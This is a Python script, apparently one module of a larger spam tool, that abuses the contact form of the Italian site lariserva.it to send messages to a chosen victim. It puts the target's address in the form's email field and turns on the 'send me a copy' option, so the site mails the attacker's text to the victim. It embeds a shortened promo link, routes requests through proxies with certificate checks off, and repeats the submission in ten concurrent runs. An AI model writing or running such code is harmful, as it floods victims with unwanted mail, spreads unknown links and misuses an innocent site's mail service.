import requests

from module import Spam


class ConcreteSpam(Spam):

    def post(self, text, target, proxies) -> requests.Response:
        cookies = {
            # 'pll_language': 'en',
            # '_gid': 'GA1.2.810563811.1664890995',
            # 'PHPSESSID': 'efca17anhurtlrcq56kcvk3lsg',
            # '_gat_gtag_UA_2136143_1': '1',
            # '_ga_732XTTDP36': 'GS1.1.1664955847.3.1.1664956058.0.0.0',
            # '_ga': 'GA1.1.501732581.1664890995',
        }
        headers = {
            'authority': 'www.lariserva.it',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'origin': 'https://www.lariserva.it',
            'referer': 'https://www.lariserva.it/en/facilities/',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        }
        data = {
            'contact_name': text,
            'contact_email': target,
            'contact_subject': text,
            'contact_message': text,
            'contact_email_copy': '1',
            'submit': '1',
        }

        response = requests.post('https://www.lariserva.it/en/facilities/',
                                 cookies=cookies, headers=headers, data=data, proxies=proxies, verify=False)
        return response


if __name__ == '__main__':
    success_message = 'Your email was sent successfully. Thank you!'
    project_name = 'lariserva'
    promo_link = 'bit.ly/3RxKclL'
    spam = ConcreteSpam(promo_link, project_name, success_message)
    result = spam.send_post()
    if result:
        spam.run_concurrently(10)
